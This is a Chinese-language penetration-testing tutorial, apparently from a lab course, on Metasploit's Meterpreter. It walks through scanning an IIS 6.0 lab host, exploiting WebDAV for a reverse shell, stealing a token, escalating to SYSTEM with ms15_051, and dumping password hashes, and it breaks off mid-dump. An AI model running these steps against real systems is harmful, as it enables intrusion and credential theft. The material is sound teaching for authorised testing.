<p>每当 Meterpreter Payload 被发送并在目标系统上运行时，我们都会收到一个<code>Meterpreter shell</code>. 然后我们可以立即发出<code>help</code>命令来查看 Meterpreter shell 的功能。</p>
<h4 id="MSF-Meterpreter-命令-1"><a href="#MSF-Meterpreter-命令-1" class="headerlink" title="MSF - Meterpreter 命令"></a>MSF - Meterpreter 命令</h4><p> MSF - Meterpreter 命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate                   Migrate the server to another process</span><br><span class="line">    pivot                     Manage pivot listeners</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, then re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br></pre></td></tr></table></figure>

<p>其中一些命令也可在模块备忘单中找到以供参考。</p>
<p>我们需要了解 Meterpreter 的主要思想是，它与在目标操作系统上获得直接 shell 一样好，但具有更多功能。Meterpreter 的开发人员为该项目设定了明确的设计目标，以期在未来的可用性上飙升。Meterpreter 需要：</p>
<ul>
<li>隐身</li>
<li>强大的</li>
<li>可扩展</li>
</ul>
<hr>
<h2 id="隐身"><a href="#隐身" class="headerlink" title="隐身"></a>隐身</h2><p>Meterpreter 在启动并到达目标后，完全驻留在内存中，不会向磁盘写入任何内容。当 Meterpreter 将自己注入到受感染的进程中时，也不会创建新进程。此外，它可以执行从一个正在运行的进程到另一个运行进程的进程迁移。</p>
<p>使用现在更新的 msfconsole-v6，目标主机和我们之间的所有 Meterpreter 有效负载通信都使用 AES 加密，以确保数据通信的机密性和完整性。</p>
<p>所有这些都提供了有限的取证证据，而且对受害机器的影响也很小。</p>
<hr>
<h2 id="强大的"><a href="#强大的" class="headerlink" title="强大的"></a>强大的</h2><p>Meterpreter 在目标主机和攻击者之间使用通道化通信系统证明非常有用。当我们通过为它打开一个专用通道立即在我们的 Meterpreter 阶段内生成一个主机操作系统 shell 时，我们可以直接注意到这一点。这也允许使用 AES 加密流量。</p>
<hr>
<h2 id="可扩展"><a href="#可扩展" class="headerlink" title="可扩展"></a>可扩展</h2><p>Meterpreter 的功能可以在运行时不断增强并通过网络加载。其模块化结构还允许在不重建的情况下添加新功能。</p>
<hr>
<h2 id="使用-Meterpreter"><a href="#使用-Meterpreter" class="headerlink" title="使用 Meterpreter"></a>使用 Meterpreter</h2><p>我们已经在有效载荷部分深入研究了 Meterpreter 的基础知识。现在，我们将了解 Meterpreter shell 的真正优势，以及它如何提高评估的有效性并在交战期间节省时间。我们首先对已知目标运行基本扫描。我们将按单点方式执行此操作，从 msfconsole 内部执行所有操作，以便从对我们目标的数据跟踪中获益。</p>
<h4 id="MSF-扫描目标"><a href="#MSF-扫描目标" class="headerlink" title="MSF - 扫描目标"></a>MSF - 扫描目标</h4><p> MSF - 扫描目标</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_nmap -sV -p- -T5 -A 10.10.10.15</span><br><span class="line"></span><br><span class="line">[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC</span><br><span class="line">[*] Nmap: Nmap scan report for 10.10.10.15</span><br><span class="line">[*] Nmap: Host is up (0.021s latency).</span><br><span class="line">[*] Nmap: Not shown: 65534 filtered ports</span><br><span class="line">[*] Nmap: PORT   STATE SERVICE VERSION</span><br><span class="line">[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0</span><br><span class="line">[*] Nmap: | http-methods:</span><br><span class="line">[*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT</span><br><span class="line">[*] Nmap: |_http-server-header: Microsoft-IIS/6.0</span><br><span class="line">[*] Nmap: |_http-title: Under Construction</span><br><span class="line">[*] Nmap: | http-webdav-scan:</span><br><span class="line">[*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span><br><span class="line">[*] Nmap: |   WebDAV type: Unknown</span><br><span class="line">[*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK</span><br><span class="line">[*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT</span><br><span class="line">[*] Nmap: |_  Server Type: Microsoft-IIS/6.0</span><br><span class="line">[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">10.10.10.15             Unknown                    device         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; services</span><br><span class="line"></span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host         port  proto  name  state  info</span><br><span class="line">----         ----  -----  ----  -----  ----</span><br><span class="line">10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0</span><br></pre></td></tr></table></figure>

<p>接下来，我们查找有关此框上运行的服务的一些信息。具体来说，我们想要探索端口 80 以及那里托管了哪种 Web 服务。</p>
<p>我们注意到这是一个正在建设中的网站——在这里看不到任何与网络相关的内容。但是，仔细查看网页的末尾和 Nmap 扫描的结果，我们注意到服务器正在运行<code>Microsoft IIS httpd 6.0</code>。因此，我们朝着这个方向进一步研究，寻找此版本 IIS 的常见漏洞。经过一番搜索，我们找到了以下标记表示一个广泛存在的漏洞：<code>CVE-2017-7269</code>. 它还具有为其开发的 Metasploit 模块。</p>
<h4 id="MSF-寻找漏洞"><a href="#MSF-寻找漏洞" class="headerlink" title="MSF - 寻找漏洞"></a>MSF - 寻找漏洞</h4><p> MSF - 寻找漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search iis_webdav_upload_asp</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                       Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                       ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; use 0</span><br><span class="line"></span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/iis/iis_webdav_upload_asp):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting        Required  Description</span><br><span class="line">   ----          ---------------        --------  -----------</span><br><span class="line">   HttpPassword                         no        The HTTP password to specify for authentication</span><br><span class="line">   HttpUsername                         no        The HTTP username to specify for authentication</span><br><span class="line">   METHOD        move                   yes       Move or copy the file on the remote system from .txt -&gt; .asp (Accepted: move, copy)</span><br><span class="line">   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload</span><br><span class="line">   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT         80                     yes       The target port (TCP)</span><br><span class="line">   SSL           false                  no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   VHOST                                no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.239.181   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure>

<p>我们继续设置所需的参数。目前，这些将是<code>LHOST</code>并且<code>RHOST</code>目标上的所有其他内容似乎都在运行默认配置。</p>
<h4 id="MSF-配置漏洞利用和有效载荷"><a href="#MSF-配置漏洞利用和有效载荷" class="headerlink" title="MSF - 配置漏洞利用和有效载荷"></a>MSF - 配置漏洞利用和有效载荷</h4><p> MSF - 配置漏洞利用和有效载荷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; set RHOST 10.10.10.15</span><br><span class="line"></span><br><span class="line">RHOST =&gt; 10.10.10.15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; set LHOST tun0</span><br><span class="line"></span><br><span class="line">LHOST =&gt; tun0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.26:4444 </span><br><span class="line">[*] Checking /metasploit28857905.asp</span><br><span class="line">[*] Uploading 612435 bytes to /metasploit28857905.txt...</span><br><span class="line">[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...</span><br><span class="line">[*] Executing /metasploit28857905.asp...</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.15</span><br><span class="line">[*] Deleting /metasploit28857905.asp (this doesn&#x27;t always work)...</span><br><span class="line">[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.26:4444 -&gt; 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>

<p>我们有 Meterpreter shell。但是，请仔细查看上面的输出。此时我们可以看到目标系统上存在一个<code>.asp</code>名为 exists 的文件。<code>metasploit28857905</code>一旦获得 Meterpreter shell，如前所述，它将驻留在内存中。因此，不需要该文件，并且尝试删除<code>msfconsole</code>，但由于访问权限而失败。留下这样的痕迹对攻击者没有好处，并且会造成巨大的责任。</p>
<p>从系统管理员的角度来看，找到与此名称类型相匹配的文件或它的轻微变体可以证明有助于在其轨道中间停止攻击。如上所述，针对文件名或签名的正则表达式匹配甚至不允许攻击者在被正确配置的安全措施切断之前生成 Meterpreter shell。</p>
<p>我们继续我们的探索。在尝试查看我们在哪个用户上运行时，我们收到一条访问被拒绝的消息。我们应该尝试将我们的进程迁移到具有更多权限的用户。</p>
<h4 id="MSF-Meterpreter-迁移"><a href="#MSF-Meterpreter-迁移" class="headerlink" title="MSF - Meterpreter 迁移"></a>MSF - Meterpreter 迁移</h4><p> MSF - Meterpreter 迁移</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">[-] 1055: Operation failed: Access is denied.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name               Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----               ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]                                                </span><br><span class="line"> 4     0     System                                                          </span><br><span class="line"> 216   1080  cidaemon.exe                                                    </span><br><span class="line"> 272   4     smss.exe                                                        </span><br><span class="line"> 292   1080  cidaemon.exe                                                    </span><br><span class="line">&lt;...SNIP...&gt;</span><br><span class="line"></span><br><span class="line"> 1712  396   alg.exe                                                         </span><br><span class="line"> 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe</span><br><span class="line"> 1920  396   dllhost.exe                                                     </span><br><span class="line"> 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe</span><br><span class="line"> 2312  592   wmiprvse.exe                                                    </span><br><span class="line"> 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe</span><br><span class="line"> 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe</span><br><span class="line"> 4076  1080  cidaemon.exe                                                    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; steal_token 1836</span><br><span class="line"></span><br><span class="line">Stolen token with username: NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\NETWORK SERVICE</span><br></pre></td></tr></table></figure>

<p>现在我们已经在系统中至少建立了一些权限级别，是时候升级该权限了。因此，我们四处寻找任何有趣的东西，并在该<code>C:\Inetpub\</code>位置找到一个有趣的文件夹，名为<code>AdminScripts</code>. 然而，不幸的是，我们无权阅读其中的内容。</p>
<h4 id="MSF-与目标交互"><a href="#MSF-与目标交互" class="headerlink" title="MSF - 与目标交互"></a>MSF - 与目标交互</h4><p>我们可以很容易地决定运行本地漏洞利用建议模块，将其附加到当前活动的 Meterpreter 会话。为此，我们将当前 Meterpreter 会话置于后台，搜索我们需要的模块，并将 SESSION 选项设置为 Meterpreter 会话的索引号，将模块绑定到它。</p>
<h4 id="MSF-会话处理"><a href="#MSF-会话处理" class="headerlink" title="MSF - 会话处理"></a>MSF - 会话处理</h4><p> MSF - 会话处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; bg</span><br><span class="line"></span><br><span class="line">Background session 1? [y/N]  y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; search local_exploit_suggester</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----    -----  -----------</span><br><span class="line">   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; use 0</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this module on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1</span><br><span class="line"></span><br><span class="line">SESSION =&gt; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.15 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 10.10.10.15 - 34 exploit checks are being tried...</span><br><span class="line">nil versions are discouraged and will be deprecated in Rubygems 4</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; </span><br></pre></td></tr></table></figure>

<p>运行侦察模块为我们提供了多种选择。通过每个单独的一个，我们降落在<code>ms15_051_client_copy_image</code>条目上，这被证明是成功的。这个漏洞利用让我们直接进入 root shell，让我们完全控制目标系统。</p>
<h4 id="MSF——特权升级"><a href="#MSF——特权升级" class="headerlink" title="MSF——特权升级"></a>MSF——特权升级</h4><p> MSF——特权升级</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms15_051_client_copy_images</span><br><span class="line"></span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms15_051_client_copy_image):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; set session 1</span><br><span class="line"></span><br><span class="line">session =&gt; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; set LHOST tun0</span><br><span class="line"></span><br><span class="line">LHOST =&gt; tun0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.26:4444 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 844 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 844...</span><br><span class="line">[*] Injecting exploit into 844...</span><br><span class="line">[*] Exploit injected. Injecting payload into 844...</span><br><span class="line">[*] Payload injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.15</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.14.26:4444 -&gt; 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<p>从这里开始，我们可以继续使用 Meterpreter 的大量功能。例如，提取哈希值、模拟我们想要的任何进程等等。</p>
<h4 id="MSF-转储哈希"><a href="#MSF-转储哈希" class="headerlink" title="MSF - 转储哈希"></a>MSF - 转储哈希</h4><p> MSF - 转储哈希</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line"></span><br><span class="line">Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::</span><br><span class="line">ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::</span><br><span 